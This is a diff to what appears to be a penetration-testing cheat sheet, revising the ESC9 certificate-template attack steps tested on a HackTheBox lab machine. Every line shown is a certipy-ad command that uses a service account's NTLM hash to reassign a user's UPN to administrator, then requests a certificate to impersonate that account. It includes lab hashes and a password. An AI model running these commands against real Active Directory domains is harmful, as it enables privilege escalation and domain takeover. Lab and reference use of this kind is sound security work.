@@ -68,11 +68,12 @@ certipy-ad auth -pfx XXXX.pfx
 ### ESC9
 Tested on https://app.hackthebox.com/machines/Certified
 ```
-certipy-ad req -username ca_operator@certified.htb -p 'Password123@' -ca certified-DC01-CA -template CertifiedAuthentication
+certipy-ad account update -username management_svc@certified.htb -hashes ':a091c1832bcdd4677c28b5a6a1295584' -user ca_operator -upn administrator
 
-certipy-ad account update -username ca_operator@certified.htb -hashes ':a091c1832bcdd4677c28b5a6a1295584' -user ca_operator -upn administrator@certified.htb
 
-certipy-ad auth -pfx administrator.pfx -domain certified.htb
+certipy-ad req -username ca_operator@certified.htb -hashes :b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -debug
+
+certipy-ad account update -username management_svc@certified.htb -hashes ':a091c1832bcdd4677c28b5a6a1295584' -user ca_operator -upn ca_operator@certified.htb
 ```
 ### ESC11
 ```
